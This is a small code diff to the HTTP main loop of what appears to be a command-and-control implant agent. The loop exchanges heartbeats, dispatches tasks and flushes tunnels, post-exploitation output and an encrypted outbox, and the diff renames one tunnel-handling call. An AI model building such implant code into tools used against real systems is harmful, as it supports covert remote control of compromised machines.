@@ -41,7 +41,7 @@ INT AgentRunExternalHttp(Agent* agent)
         if (TransportHttpTransformExchange(&ctx->profile, &heartbeat, NULL, &tasks)) {
             AgentDispatchTasks(ctx, &tasks);
             AgentFlushTransfers(ctx);
-            AgentFlushTunnels(ctx);
+            AgentHarvestTunnels(ctx);
             AgentFlushCascade(ctx);
             AgentFlushPostEx(ctx);
             AgentFlushOutbox(ctx, HttpSendEncrypted, &heartbeat);
